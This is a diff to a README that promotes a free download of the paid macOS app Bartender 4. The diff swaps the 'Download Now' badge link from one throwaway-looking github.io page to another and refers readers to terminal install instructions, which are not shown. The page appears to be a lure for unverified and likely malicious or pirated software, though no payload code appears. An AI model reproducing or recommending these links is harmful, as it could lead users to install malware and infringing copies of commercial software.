@@ -2,7 +2,7 @@
 
 Bartender 4 is a powerful macOS menu bar organization tool that helps you declutter and manage your menu bar icons with ease. Follow the instructions below to download and install Bartender 4 on your Mac for free.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://fituganshfgh.github.io/.github/bartender)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/bartender)
 
 If the download button above doesn't work, follow the step-by-step terminal instructions below.
 
